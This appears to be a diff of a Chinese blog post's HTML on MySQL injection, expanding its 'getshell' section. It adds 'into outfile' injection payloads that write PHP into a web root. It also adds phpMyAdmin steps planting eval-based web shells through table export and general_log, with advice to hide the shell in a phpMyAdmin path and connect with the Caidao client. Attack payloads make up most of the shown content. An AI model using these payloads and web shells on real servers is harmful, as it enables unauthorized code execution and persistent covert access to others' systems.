@@ -93,7 +93,9 @@
                         
                             <i class="fa fa-tags fa-fw"></i>
                             
-                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>&nbsp;&#47;
+                            
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/getshell">getshell</a>
                             
                         
                         
@@ -109,10 +111,10 @@
  * @Author: reber
  * @Mail: reber0ask@qq.com
  * @Date: 2019-04-10 10:45:00
- * @LastEditTime: 2019-08-15 15:19:43
+ * @LastEditTime : 2020-04-29 16:58:30
  -->
 
-<h3 id="0x00-load-file">0x00 load_file()</h3>
+<h3 id="0x00-load-file-读文件">0x00 load_file() 读文件</h3>
 
 <ul>
 <li>条件:</li>
@@ -146,7 +148,7 @@
 </ul></li>
 </ul>
 
-<h3 id="0x01-into-outfile">0x01 into outfile</h3>
+<h3 id="0x01-into-outfile-getshell">0x01 into outfile getshell</h3>
 
 <ul>
 <li>条件：</li>
@@ -164,35 +166,46 @@
 当知道路径时，可以直接用</li>
 </ul>
 
-<p><code>id=1 union select &quot;&lt;? phpinfo();&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;)</code></p>
+<pre><code>id=1 union select &quot;&lt;? phpinfo();&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;)
 
-<p>或者</p>
-
-<p><code>id=1 into outfile 'C:/phpStudy/WWW/a.php' fields terminated by '&lt;? phpinfo();&gt;';</code></p>
+id=1 into outfile 'C:/phpStudy/WWW/a.php' columns terminated by '&lt;? phpinfo();&gt;';
+id=1 into outfile 'C:/phpStudy/WWW/a.php' fields terminated by '&lt;? phpinfo();&gt;';
+id=1 into outfile 'C:/phpStudy/WWW/a.php' lines terminated by '&lt;? phpinfo();&gt;';
+id=1 into outfile 'C:/phpStudy/WWW/a.php' lines starting by '&lt;? phpinfo();&gt;';
+</code></pre>
 
 <ul>
-<li><p>其他方法</p>
+<li>phpMyAdmin 导出数据 getshell</li>
+</ul>
 
-<ul>
-<li><p>登陆phpMyAdmin</p>
+<p>登陆phpMyAdmin</p>
 
 <pre><code>use test;  选择数据库为test
 create table aaa(bbb varchar(64));   在数据库中创建一个表aaa
-insert into aaa values(&quot;&lt;?php @eval($_POST['c']);?&gt;&quot;); --在aaa中插入一条数据&lt;?php @eval($_POST['c']);?&gt;
-select * from aaa into outfile 'C:/phpStudy/WWW/a.php'; --将aaa中的数据导出到文件a.php
-</code></pre></li>
+insert into aaa values(&quot;&lt;?php @eval($_POST['c']);?&gt;&quot;); --在 aaa 中写入 shell 内容
+select * from aaa into outfile 'C:/phpStudy/WWW/a.php'; --将 aaa 中的数据导出到文件 a.php
+</code></pre>
 
-<li><p>localhost:80/a.php能访问</p>
+<p>localhost:80/a.php能访问</p>
 
 <pre><code>drop aaa; --删除建立的表
-</code></pre></li>
+</code></pre>
 
-<li><p>然后菜刀连接</p>
+<p>然后菜刀连接</p>
 
 <pre><code class="language-ini">菜刀连接http://www.aa.com/a.php，然后更改shell的名字并将shell放在较隐蔽的地方，比如C:\phpStudy\WWW\phpMyAdmin\setup\lib\common.php
-</code></pre></li>
-</ul></li>
+</code></pre>
+
+<ul>
+<li>phpMyAdmin 日志 getshell</li>
 </ul>
+
+<pre><code>show variables like '%general%';             #查看配置
+set global general_log = on;                 #开启general log模式
+set global general_log_file = 'C:/phpStudy/WWW/a.php'; #设置日志目录为shell地址
+select '&lt;?php eval($_GET[g]);?&gt;'             #写入shell
+set global general_log=off;                  #关闭general log模式
+</code></pre>
 
 <h3 id="0x02-防御">0x02 防御</h3>
 
@@ -364,7 +377,7 @@ select * from aaa into outfile 'C:/phpStudy/WWW/a.php'; --将aaa中的数据导�
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/getshell" title="getshell">getshell</a>
-                <sup>3</sup>
+                <sup>4</sup>
             </p>
         
             <p style="display:inline-block;">
